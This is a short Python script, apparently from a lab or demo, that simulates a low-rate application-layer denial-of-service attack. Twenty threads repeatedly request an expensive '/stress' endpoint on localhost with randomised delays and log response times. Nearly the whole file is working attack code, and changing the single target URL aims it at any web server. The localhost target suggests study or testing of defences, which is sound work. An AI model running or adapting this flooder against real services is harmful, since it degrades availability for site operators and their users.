import threading
import time
import random
import requests


TARGET_URL = "http://127.0.0.1:5000/stress"

# Number of attacking clients
ATTACK_THREADS = 20

# Average delay between requests
REQUEST_INTERVAL = 1

# Random delay variation
RANDOM_DELAY = 0.8


def low_rate_attack(client_id):
    """
    Simulate one attacker continuously sending
    low-frequency but expensive requests.
    """

    session = requests.Session()

    # Stagger the clients so they don't all start together
    time.sleep(client_id * 0.2)

    while True:

        try:

            start = time.perf_counter()

            response = session.get(
                TARGET_URL,
                timeout=60
            )

            elapsed = time.perf_counter() - start

            print(
                f"[Client {client_id}] "
                f"{response.status_code} | "
                f"{elapsed:.2f}s"
            )

        except Exception as error:

            print(
                f"[Client {client_id}] Error: {error}"
            )

        delay = REQUEST_INTERVAL + random.uniform(
            -RANDOM_DELAY,
            RANDOM_DELAY
        )

        if delay < 0.2:
            delay = 0.2

        time.sleep(delay)


def start_attack():

    print("=" * 60)
    print("LOW-RATE APPLICATION-LAYER DDoS SIMULATION")
    print("=" * 60)
    print(f"Target   : {TARGET_URL}")
    print(f"Clients  : {ATTACK_THREADS}")
    print(f"Average Interval : {REQUEST_INTERVAL:.1f} sec")
    print()

    threads = []

    for i in range(ATTACK_THREADS):

        thread = threading.Thread(
            target=low_rate_attack,
            args=(i + 1,),
            daemon=True
        )

        thread.start()

        threads.append(thread)

    while True:
        time.sleep(1)


if __name__ == "__main__":
    start_attack()